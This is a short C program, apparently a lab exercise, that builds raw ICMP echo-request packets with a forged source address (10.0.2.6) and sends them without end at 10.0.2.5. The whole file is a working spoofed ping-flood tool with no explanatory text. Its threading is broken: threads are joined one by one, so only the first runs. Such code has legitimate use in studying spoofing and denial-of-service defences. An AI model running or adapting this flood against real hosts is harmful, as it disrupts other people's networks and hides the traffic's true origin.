#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<netinet/ip.h>
#include <stdlib.h>
#include <unistd.h> 
#include <pthread.h>


struct icmpheader{
    unsigned char icmp_type;
    unsigned char icmp_code;
    unsigned short int icmp_chksum;
    unsigned short int icmp_id;
    unsigned short int icmp_seq;
};

struct ipheader{
    unsigned char iph_ihl:4;
    unsigned char iph_ver:4;
    unsigned char iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_flag:3,
                        iph_offset:13;
    unsigned char iph_ttl;
    unsigned char iph_protocol;
    unsigned short int iph_chksum;
    struct in_addr iph_sourceip;
    struct in_addr iph_destip;
};

unsigned short in_cksum (unsigned short *buf , int length );
void send_raw_ip_packet (struct ipheader* ip );


void *myThreadFun(void *vargp)
{
    struct ipheader* ip = (struct ipheader*)vargp;
    for(;;)
    {
        send_raw_ip_packet(ip);
    }
    return NULL;
}

int main()
{

    char buffer[1500];
    memset(buffer,0,1500);

    struct icmpheader *icmp = (struct icmpheader *)(buffer + sizeof (struct ipheader));
    icmp->icmp_type = 8 ;
    icmp->icmp_chksum = 0;
    icmp->icmp_chksum = in_cksum ((unsigned short *) icmp ,sizeof(struct icmpheader));

    struct ipheader *ip = (struct ipheader *) buffer;
    ip->iph_ver = 4;
    ip->iph_ihl = 5;
    ip->iph_ttl = 20;
    ip->iph_sourceip.s_addr = inet_addr("10.0.2.6");
    ip->iph_destip.s_addr = inet_addr("10.0.2.5");
    ip->iph_protocol = IPPROTO_ICMP;
    ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct icmpheader));

    
    pthread_t thread_id[5];
    int i;
    for(i=0;i<5;i++)
    {
        pthread_create(&thread_id[i], NULL, myThreadFun, ip);
        pthread_join(thread_id[i], NULL);

    }
    

    return 0;
}


unsigned short in_cksum(unsigned short *buf , int length)
{
    unsigned short *w = buf;
    int nleft = length;
    int sum = 0;
    unsigned short temp = 0; 
    while(nleft > 1 ){
        sum += *w++;
        nleft -= 2;
    }
    if(nleft == 1 ){
        *(u_char *)(&temp) = *(u_char *)w;
        sum  += temp;
    }
    sum = (sum >> 16) + (sum & 0xffff );
    sum += (sum >> 16 );
    return (unsigned short ) (~sum ) ;
}

void send_raw_ip_packet (struct ipheader* ip )
{
    struct sockaddr_in dest_info;
    int enable = 1;
    int sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
    setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&enable,sizeof(enable));
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;
    sendto(sock,ip,ntohs(ip->iph_len),0,(struct sockaddr*) &dest_info,sizeof(dest_info));
    close(sock) ;
}